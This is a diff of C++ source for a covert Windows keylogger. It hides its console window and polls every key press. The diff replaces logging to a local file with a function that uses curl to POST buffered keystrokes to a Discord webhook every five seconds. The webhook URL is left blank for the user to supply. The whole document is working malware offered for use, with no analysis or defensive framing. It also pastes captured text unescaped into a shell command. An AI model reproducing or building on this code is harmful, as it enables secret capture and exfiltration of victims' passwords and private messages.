@@ -1,116 +1,92 @@
 #define _WIN32_WINNT 0x0500
 #include <Windows.h>
 #include <string>
-#include <stdlib.h>
-#include <stdio.h>
 #include <iostream>
-#include <fstream>
-
-
 
 using namespace std;
-
-
-
-void LOG(string input) {
-	fstream LogFile;
-	LogFile.open("dat.txt", fstream::app);
-	if (LogFile.is_open()) {
-		LogFile << input;
-		LogFile.close();
-	}
-}
-
 
 bool SpecialKeys(int S_Key) {
 	switch (S_Key) {
 	case VK_SPACE:
 		cout << " ";
-		LOG(" ");
 		return true;
 	case VK_RETURN:
 		cout << "\n";
-		LOG("\n");
 		return true;
-	case '¾':
-		cout << ".";
-		LOG(".");
-		return true;
+	case 190: // ASCII code for '.' on US keyboard
+	cout << ".";
+	return true;
 	case VK_SHIFT:
 		cout << "#SHIFT#";
-		LOG("#SHIFT#");
 		return true;
 	case VK_BACK:
 		cout << "\b";
-		LOG("\b");
 		return true;
 	case VK_RBUTTON:
 		cout << "#R_CLICK#";
-		LOG("#R_CLICK#");
 		return true;
 	case VK_CAPITAL:
 		cout << "#CAPS_LOCK#";
-		LOG("#CAPS_LCOK");
 		return true;
 	case VK_TAB:
 		cout << "#TAB";
-		LOG("#TAB");
 		return true;
 	case VK_UP:
 		cout << "#UP";
-		LOG("#UP_ARROW_KEY");
 		return true;
 	case VK_DOWN:
 		cout << "#DOWN";
-		LOG("#DOWN_ARROW_KEY");
 		return true;
 	case VK_LEFT:
 		cout << "#LEFT";
-		LOG("#LEFT_ARROW_KEY");
 		return true;
 	case VK_RIGHT:
 		cout << "#RIGHT";
-		LOG("#RIGHT_ARROW_KEY");
 		return true;
 	case VK_CONTROL:
 		cout << "#CONTROL";
-		LOG("#CONTROL");
 		return true;
 	case VK_MENU:
 		cout << "#ALT";
-		LOG("#ALT");
 		return true;
 	default: 
 		return false;
 	}
 }
+void sendToDiscord(const std::string& message) {
+	//||||||||||||||||||||||||||||||||
+	//ADD YOUR DISCORD WEBHOOK HERE|||
+    std::string webhookUrl = "";//||||
+	//||||||||||||||||||||||||||||||||
+	//||||||||||||||||||||||||||||||||
 
 
+    std::string command = "curl -H \"Content-Type: application/json\" -X POST -d \"{\\\"content\\\": \\\"" + message + "\\\"}\" \"" + webhookUrl + "\"";
+    system(command.c_str());
+}
 
 int main()
 {
-	ShowWindow(GetConsoleWindow(), SW_HIDE);
-	char KEY = 'x';
+	ShowWindow(GetConsoleWindow(), SW_HIDE); // Optional: hide console window
+    string buffer;
 
+auto lastSent = GetTickCount();
 	while (true) {
-		Sleep(10);
-		for (int KEY = 8; KEY <= 190; KEY++)
-		{
-			if (GetAsyncKeyState(KEY) == -32767) {
-				if (SpecialKeys(KEY) == false) {
+    for (int KEY = 8; KEY <= 190; KEY++) {
+        if (GetAsyncKeyState(KEY) & 1) {
+            if (!SpecialKeys(KEY)) {
+                buffer += char(KEY); // still naive, replace later with ToAscii logic
+            }
+        }
+    }
 
-					fstream LogFile;
-					LogFile.open("dat.txt", fstream::app);
-					if (LogFile.is_open()) {
-						LogFile << char(KEY);
-						LogFile.close();
-					}
+    if (GetTickCount() - lastSent > 5000 && !buffer.empty()) { // every 5s
+        sendToDiscord(buffer);
+        buffer.clear();
+        lastSent = GetTickCount();
+    }
 
-				}
-			}
-		}
-	}
-
+    Sleep(1);
+}
 	return 0;
 }
-
